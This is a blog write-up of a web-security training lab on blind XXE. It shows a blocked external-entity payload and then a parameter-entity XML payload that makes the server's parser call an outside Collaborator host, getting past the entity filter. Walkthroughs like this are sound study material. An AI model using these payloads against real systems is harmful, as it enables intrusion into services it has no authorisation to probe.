---
layout: post
title:  "Blind XXE with out-of-band interaction via XML parameter entities"
date:   2024-11-23 10:20:54 +0530
categories: [BSCP, XXE]
---

## Objective 

This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.

To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator. 

## Solution 

This lab also includes the XXE in check stock functionality but when I use regular entity based payload meaning I used the same payload of the previous lab 

```xml
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://burpcollaborator.net"> ]> 
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

Observing the response where it says `"Entities are not allowed for security reasons"` there is some kind of block out there 

![]({{ site.baseurl }}/assets/images/xxe/xxe-18.png)

But when we replace the `&xxe` entity with the actual `productId` which is `1` will reveal the stock count of the product but no external pingback to the collaborator 

![]({{ site.baseurl }}/assets/images/xxe/xxe-19.png)

Now in order to bypass we can use xml entity parameter, where we can able to reference it with in the DTD.. Firstly it's referenced in percent character before the entity name and referenced else where inside the DTD with `%xxe;` instead of `&xxe;` 

Just combining all together with the following payload 

```xml
<!DOCTYPE stockCheck [ <!ENTITY % xxe SYSTEM "http://bxcluruc7sgb3cwctx3lj8v9c0is6ju8.oastify.com"> %xxe; ]> 
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Sent the request with the above payload as `POST` body and shows the `XML error` in the response.. But, checking the collaborator we got the pingbacks from the server 

![]({{ site.baseurl }}/assets/images/xxe/xxe-20.png)

Since we managed to recieve the pingbacks... our objective is achieved and that solves the lab 

![]({{ site.baseurl }}/assets/images/xxe/xxe-21.png)